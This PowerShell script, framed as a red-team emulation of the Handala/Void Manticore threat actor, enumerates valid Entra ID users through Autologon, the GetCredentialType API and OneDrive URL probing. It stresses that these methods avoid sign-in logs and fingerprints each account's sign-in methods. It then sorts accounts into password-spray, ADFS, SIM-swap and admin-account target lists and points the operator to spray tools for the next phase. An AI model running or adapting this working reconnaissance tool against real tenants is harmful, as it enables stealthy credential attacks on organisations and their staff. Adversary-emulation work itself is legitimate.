#Requires -Version 5.1
<#
.SYNOPSIS
    Invoke-HandalaUserEnum.ps1 — Multi-Domain Entra ID User Enumeration
    Phase 2 of Handala/Void Manticore TTP Emulation

.DESCRIPTION
    Enumerates valid Entra ID users across all discovered tenant domains.
    Auto-selects the stealthiest enumeration method based on Phase 1 recon:
      - Autologon (Seamless SSO required) → ZERO sign-in logs
      - GetCredentialType                 → No sign-in logs, may throttle
      - OneDrive URL probing              → No sign-in logs, minimal throttle

    Also performs per-user authentication method fingerprinting to identify:
      - Accounts with password auth (spray targets)
      - Accounts with FIDO2/WHfB (spray-resistant)
      - Accounts with phone/SMS MFA (SIM swap potential)
      - Federated accounts (ADFS spray targets)

    Consumes output from Invoke-HandalaRecon.ps1 (Phase 1).

.PARAMETER ReconDir
    Path to Phase 1 output directory containing 00_summary.json and 07_username_targets.txt

.PARAMETER UserFile
    Override: path to custom username file (one UPN per line). Skips ReconDir username list.

.PARAMETER Method
    Force a specific enumeration method: Autologon, GetCredentialType, OneDrive, Auto (default).
    Auto selects Autologon if SSO is enabled, GetCredentialType otherwise.

.PARAMETER Delay
    Delay in milliseconds between enumeration requests. Default: 200
    Increase if hitting throttle limits (429 responses).

.PARAMETER FingerprintAuth
    After enumeration, fingerprint authentication methods for valid users via GetCredentialType.
    Default: $true. Set -FingerprintAuth:$false to skip.

.PARAMETER OutputDir
    Output directory. Default: same as ReconDir or .\enum-<date>

.EXAMPLE
    .\Invoke-HandalaUserEnum.ps1 -ReconDir .\recon-target_com-20260326
    
.EXAMPLE
    .\Invoke-HandalaUserEnum.ps1 -UserFile .\custom-users.txt -Method Autologon -Delay 500

.NOTES
    OPSEC: Autologon and GetCredentialType methods generate NO sign-in logs.
           OneDrive probing also generates no logs.
           Only the "Login" method (not implemented here) creates sign-in events.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $false)]
    [string]$ReconDir,

    [Parameter(Mandatory = $false)]
    [string]$UserFile,

    [ValidateSet("Autologon", "GetCredentialType", "OneDrive", "Auto")]
    [string]$Method = "Auto",

    [int]$Delay = 200,

    [bool]$FingerprintAuth = $true,

    [string]$OutputDir
)

$ErrorActionPreference = "Continue"
$ProgressPreference = "SilentlyContinue"

# ============================================================
# INITIALIZATION
# ============================================================

function Write-Phase  { param([string]$M) Write-Host "`n[*] $M" -ForegroundColor Cyan }
function Write-Finding { param([string]$M) Write-Host "  [+] $M" -ForegroundColor Green }
function Write-Alert  { param([string]$M) Write-Host "  [!] $M" -ForegroundColor Yellow }
function Write-Fail   { param([string]$M) Write-Host "  [-] $M" -ForegroundColor Red }

# Load Phase 1 data if available
$reconSummary = $null
$ssoEnabled = $false

if ($ReconDir -and (Test-Path "$ReconDir\00_summary.json")) {
    $reconSummary = Get-Content "$ReconDir\00_summary.json" -Raw | ConvertFrom-Json
    $ssoEnabled = $reconSummary.SeamlessSSO -eq $true
    Write-Finding "Loaded Phase 1 recon: $($reconSummary.Target)"
    Write-Finding "  SSO Enabled: $ssoEnabled | Domains: $($reconSummary.DomainsDiscovered) | MDI: $($reconSummary.MDIDetected)"
}

# Determine username source
$usernames = @()
if ($UserFile -and (Test-Path $UserFile)) {
    $usernames = Get-Content $UserFile | Where-Object { $_.Trim() -ne "" -and $_ -match "@" }
    Write-Finding "Loaded $($usernames.Count) usernames from $UserFile"
}
elseif ($ReconDir -and (Test-Path "$ReconDir\07_username_targets.txt")) {
    $usernames = Get-Content "$ReconDir\07_username_targets.txt" | Where-Object { $_.Trim() -ne "" -and $_ -match "@" }
    Write-Finding "Loaded $($usernames.Count) usernames from Phase 1 output"
}
else {
    Write-Fail "No username source found. Provide -UserFile or -ReconDir with 07_username_targets.txt"
    return
}

if (-not $OutputDir) {
    if ($ReconDir) { $OutputDir = $ReconDir }
    else { $OutputDir = ".\enum-$(Get-Date -Format 'yyyyMMdd-HHmm')" }
}
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null

# ============================================================
# METHOD SELECTION
# ============================================================

Write-Phase "Method Selection"

# Check AADInternals availability
$aadAvailable = $false
try {
    Import-Module AADInternals -ErrorAction Stop
    $aadAvailable = $true
}
catch {
    Write-Alert "AADInternals not available — falling back to raw API methods"
}

if ($Method -eq "Auto") {
    if ($ssoEnabled -and $aadAvailable) {
        $Method = "Autologon"
        Write-Finding "Auto-selected: Autologon (SSO enabled — ZERO sign-in logs)"
    }
    elseif ($aadAvailable) {
        $Method = "GetCredentialType"
        Write-Finding "Auto-selected: GetCredentialType (no sign-in logs, may throttle)"
    }
    else {
        $Method = "GetCredentialType"
        Write-Finding "Auto-selected: GetCredentialType via raw API (AADInternals not available)"
    }
}

Write-Phase "User Enumeration — $Method method — $($usernames.Count) targets"

# ============================================================
# ENUMERATION ENGINE
# ============================================================

$validUsers = @()
$invalidUsers = @()
$throttled = 0
$errors = 0
$startTime = Get-Date

if ($Method -eq "Autologon" -and $aadAvailable) {
    # ----------------------------------------------------------
    # METHOD: AADInternals Autologon
    # STEALTH: ZERO sign-in logs — completely undetectable
    # REQUIRES: Seamless SSO (Desktop SSO) enabled on tenant
    # ----------------------------------------------------------
    
    $batchSize = 100
    for ($i = 0; $i -lt $usernames.Count; $i += $batchSize) {
        $batch = $usernames[$i..([Math]::Min($i + $batchSize - 1, $usernames.Count - 1))]
        
        try {
            $results = $batch | Invoke-AADIntUserEnumerationAsOutsider -Method Autologon
            
            foreach ($r in $results) {
                if ($r.Exists) {
                    $validUsers += [ordered]@{
                        UserPrincipalName = $r.UserName
                        Exists            = $true
                        Method            = "Autologon"
                        Domain            = ($r.UserName -split '@')[1]
                    }
                }
                else {
                    $invalidUsers += $r.UserName
                }
            }
        }
        catch {
            $errors++
            Write-Fail "Batch error at offset $i : $_"
        }
        
        # Progress update
        $processed = [Math]::Min($i + $batchSize, $usernames.Count)
        $pct = [math]::Round(($processed / $usernames.Count) * 100)
        Write-Host "  [$processed/$($usernames.Count)] ($pct%) — Valid: $($validUsers.Count)" -ForegroundColor DarkGray
        
        Start-Sleep -Milliseconds $Delay
    }
}
elseif ($Method -eq "GetCredentialType") {
    # ----------------------------------------------------------
    # METHOD: GetCredentialType API
    # STEALTH: No sign-in logs generated. Moderate throttling.
    # WORKS: Always (no SSO requirement)
    # BONUS: Returns auth method hints for valid users
    # ----------------------------------------------------------
    
    $apiUrl = "https://login.microsoftonline.com/common/GetCredentialType"
    
    foreach ($username in $usernames) {
        $body = @{
            username               = $username
            isOtherIdpSupported    = $true
            checkPhones            = $true
            isRemoteNGCSupported   = $true
            isCookieBannerShown    = $false
            isFidoSupported        = $true
            isAccessPassSupported  = $true
        } | ConvertTo-Json
        
        try {
            $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $body `
                -ContentType "application/json" -ErrorAction Stop
            
            # IfExistsResult: 0 = exists, 1 = doesn't exist, 5 = exists (different tenant), 6 = not found
            $exists = $response.IfExistsResult -eq 0
            
            if ($response.ThrottleStatus -eq 1) {
                $throttled++
                if ($throttled % 10 -eq 1) {
                    Write-Alert "Throttled ($throttled times) — consider increasing -Delay"
                }
                Start-Sleep -Seconds 5  # Back off on throttle
            }
            
            if ($exists) {
                $userEntry = [ordered]@{
                    UserPrincipalName = $username
                    Exists            = $true
                    Method            = "GetCredentialType"
                    Domain            = ($username -split '@')[1]
                    NameSpaceType     = $response.NameSpaceType
                    HasPassword       = $response.Credentials.HasPassword
                    PrefCredential    = $response.Credentials.PrefCredential
                    IsFederated       = ($response.NameSpaceType -eq "Federated")
                    FederationRedirect = $response.Credentials.FederationRedirectUrl
                    SSOEnabled        = $response.EstsProperties.DesktopSsoEnabled
                }
                
                # Map PrefCredential to human-readable
                $credMap = @{
                    1 = "Password"
                    4 = "Phone/SMS"
                    6 = "FIDO2"
                    7 = "WindowsHello"
                }
                $userEntry.PreferredAuth = if ($credMap[$response.Credentials.PrefCredential]) {
                    $credMap[$response.Credentials.PrefCredential]
                } else { "Unknown ($($response.Credentials.PrefCredential))" }
                
                $validUsers += $userEntry
            }
            else {
                $invalidUsers += $username
            }
        }
        catch {
            $errors++
            if ($errors % 20 -eq 1) {
                Write-Fail "API error ($errors total): $_"
            }
        }
        
        # Progress every 50 users
        if (($validUsers.Count + $invalidUsers.Count) % 50 -eq 0) {
            $total = $validUsers.Count + $invalidUsers.Count
            $pct = [math]::Round(($total / $usernames.Count) * 100)
            Write-Host "  [$total/$($usernames.Count)] ($pct%) — Valid: $($validUsers.Count) | Throttled: $throttled" -ForegroundColor DarkGray
        }
        
        Start-Sleep -Milliseconds $Delay
    }
}
elseif ($Method -eq "OneDrive") {
    # ----------------------------------------------------------
    # METHOD: OneDrive URL Probing
    # STEALTH: No sign-in logs. Minimal throttling.
    # REQUIRES: Tenant name (*.onmicrosoft.com prefix)
    # LIMITATION: Only works for users with OneDrive provisioned
    # ----------------------------------------------------------
    
    $tenantName = if ($reconSummary.TenantName) { $reconSummary.TenantName } 
                  else { ($usernames[0] -split '@')[1] -replace '\..*', '' }
    
    Write-Finding "Using tenant prefix: $tenantName"
    
    foreach ($username in $usernames) {
        # Convert UPN to OneDrive URL format: first_last_domain_com
        $localPart = ($username -split '@')[0]
        $domainPart = ($username -split '@')[1] -replace '\.', '_'
        $oneDrivePath = "${localPart}_${domainPart}" -replace '\.', '_'
        
        $url = "https://${tenantName}-my.sharepoint.com/personal/$oneDrivePath/_layouts/15/onedrive.aspx"
        
        try {
            $response = Invoke-WebRequest -Uri $url -Method Head -ErrorAction Stop -TimeoutSec 10 -MaximumRedirection 0
            $status = $response.StatusCode
        }
        catch {
            if ($_.Exception.Response) {
                $status = [int]$_.Exception.Response.StatusCode
            }
            else {
                $status = 0
            }
        }
        
        # 403 or 401 = user exists (OneDrive provisioned, access denied)
        # 404 = user doesn't exist or OneDrive not provisioned
        if ($status -eq 403 -or $status -eq 401 -or $status -eq 302) {
            $validUsers += [ordered]@{
                UserPrincipalName = $username
                Exists            = $true
                Method            = "OneDrive"
                Domain            = ($username -split '@')[1]
                OneDriveStatus    = $status
            }
        }
        else {
            $invalidUsers += $username
        }
        
        if (($validUsers.Count + $invalidUsers.Count) % 50 -eq 0) {
            $total = $validUsers.Count + $invalidUsers.Count
            Write-Host "  [$total/$($usernames.Count)] — Valid: $($validUsers.Count)" -ForegroundColor DarkGray
        }
        
        Start-Sleep -Milliseconds $Delay
    }
}

$elapsed = (Get-Date) - $startTime

# ============================================================
# AUTH METHOD FINGERPRINTING (for valid users)
# ============================================================

if ($FingerprintAuth -and $Method -ne "GetCredentialType" -and $validUsers.Count -gt 0) {
    # GetCredentialType already captures this data during enum
    # For other methods, do a second pass on valid users only
    
    Write-Phase "Auth Method Fingerprinting — $($validUsers.Count) valid users"
    
    $apiUrl = "https://login.microsoftonline.com/common/GetCredentialType"
    
    for ($i = 0; $i -lt $validUsers.Count; $i++) {
        $user = $validUsers[$i]
        $body = @{
            username               = $user.UserPrincipalName
            isOtherIdpSupported    = $true
            checkPhones            = $true
            isRemoteNGCSupported   = $true
            isFidoSupported        = $true
            isAccessPassSupported  = $true
        } | ConvertTo-Json
        
        try {
            $r = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $body `
                -ContentType "application/json" -ErrorAction Stop
            
            $credMap = @{ 1 = "Password"; 4 = "Phone/SMS"; 6 = "FIDO2"; 7 = "WindowsHello" }
            
            $validUsers[$i].HasPassword      = $r.Credentials.HasPassword
            $validUsers[$i].PrefCredential   = $r.Credentials.PrefCredential
            $validUsers[$i].PreferredAuth    = if ($credMap[$r.Credentials.PrefCredential]) { $credMap[$r.Credentials.PrefCredential] } else { "Unknown" }
            $validUsers[$i].IsFederated      = ($r.NameSpaceType -eq "Federated")
            $validUsers[$i].NameSpaceType    = $r.NameSpaceType
            $validUsers[$i].SSOEnabled       = $r.EstsProperties.DesktopSsoEnabled
        }
        catch {
            # Non-critical — continue
        }
        
        Start-Sleep -Milliseconds $Delay
    }
}

# ============================================================
# ANALYSIS & OUTPUT
# ============================================================

Write-Phase "Enumeration Results"

# Categorize users for Phase 3
$sprayTargets = $validUsers | Where-Object { 
    $_.HasPassword -eq $true -and $_.IsFederated -ne $true 
}
$adfsTargets = $validUsers | Where-Object { $_.IsFederated -eq $true }
$fidoProtected = $validUsers | Where-Object { $_.PreferredAuth -match "FIDO2|WindowsHello" }
$phoneAuth = $validUsers | Where-Object { $_.PreferredAuth -eq "Phone/SMS" }

# Identify admin-pattern accounts
$adminKeywords = "admin|helpdesk|service|svc-|breakglass|emergency|global|intune|security|sync|devops"
$adminAccounts = $validUsers | Where-Object { $_.UserPrincipalName -match $adminKeywords }

Write-Host "`n$('=' * 60)" -ForegroundColor White
Write-Host "  ENUMERATION COMPLETE" -ForegroundColor White
Write-Host "$('=' * 60)" -ForegroundColor White
Write-Host "  Method:           $Method"
Write-Host "  Duration:         $([math]::Round($elapsed.TotalMinutes, 1)) minutes"
Write-Host "  Tested:           $($usernames.Count)"
Write-Host "  Valid Users:      $($validUsers.Count)" -ForegroundColor Green
Write-Host "  Invalid:          $($invalidUsers.Count)"
Write-Host "  Throttled:        $throttled"
Write-Host "  Errors:           $errors"
Write-Host ""
Write-Host "  --- Phase 3 Targeting ---" -ForegroundColor Cyan
Write-Host "  Spray Targets (password, managed):  $($sprayTargets.Count)" -ForegroundColor Yellow
Write-Host "  ADFS Targets (federated):           $($adfsTargets.Count)" -ForegroundColor Yellow
Write-Host "  FIDO2/WHfB Protected:               $($fidoProtected.Count)" -ForegroundColor Green
Write-Host "  Phone/SMS MFA:                      $($phoneAuth.Count)"
Write-Host "  Admin-Pattern Accounts:             $($adminAccounts.Count)" -ForegroundColor Red

if ($adminAccounts.Count -gt 0) {
    Write-Host "`n  Admin/Service Accounts Found:" -ForegroundColor Red
    $adminAccounts | ForEach-Object {
        $auth = if ($_.PreferredAuth) { $_.PreferredAuth } else { "Unknown" }
        $fed = if ($_.IsFederated) { "[FED]" } else { "[MGD]" }
        Write-Host "    $fed $($_.UserPrincipalName) — Auth: $auth" -ForegroundColor Yellow
    }
}

Write-Host "$('=' * 60)`n" -ForegroundColor White

# Save outputs
$validUsers | ConvertTo-Json -Depth 5 | Out-File (Join-Path $OutputDir "08_valid_users.json") -Encoding UTF8
$validUsers | ForEach-Object { $_.UserPrincipalName } | Out-File (Join-Path $OutputDir "08_valid_users.txt") -Encoding UTF8

if ($sprayTargets.Count -gt 0) {
    $sprayTargets | ForEach-Object { $_.UserPrincipalName } | Out-File (Join-Path $OutputDir "08_spray_targets.txt") -Encoding UTF8
}
if ($adfsTargets.Count -gt 0) {
    $adfsTargets | ForEach-Object { $_.UserPrincipalName } | Out-File (Join-Path $OutputDir "08_adfs_targets.txt") -Encoding UTF8
}
if ($adminAccounts.Count -gt 0) {
    $adminAccounts | ConvertTo-Json -Depth 5 | Out-File (Join-Path $OutputDir "08_admin_accounts.json") -Encoding UTF8
}

$enumSummary = [ordered]@{
    Target             = if ($reconSummary) { $reconSummary.Target } else { ($usernames[0] -split '@')[1] }
    Method             = $Method
    Duration           = "$([math]::Round($elapsed.TotalMinutes, 1)) minutes"
    Tested             = $usernames.Count
    ValidUsers         = $validUsers.Count
    SprayTargets       = $sprayTargets.Count
    ADFSTargets        = $adfsTargets.Count
    FIDO2Protected     = $fidoProtected.Count
    PhoneAuth          = $phoneAuth.Count
    AdminAccounts      = $adminAccounts.Count
    Throttled          = $throttled
    Errors             = $errors
    CompletedAt        = (Get-Date -Format "o")
}
$enumSummary | ConvertTo-Json | Out-File (Join-Path $OutputDir "08_enum_summary.json") -Encoding UTF8

Write-Host "[*] Output saved to: $OutputDir" -ForegroundColor Cyan
Write-Host "[*] Next: Run credential validation with 08_spray_targets.txt and 08_adfs_targets.txt" -ForegroundColor Cyan
Write-Host "[*]       Use TREVORspray / o365spray for spray, MSOLSpray for quick validation`n" -ForegroundColor Cyan
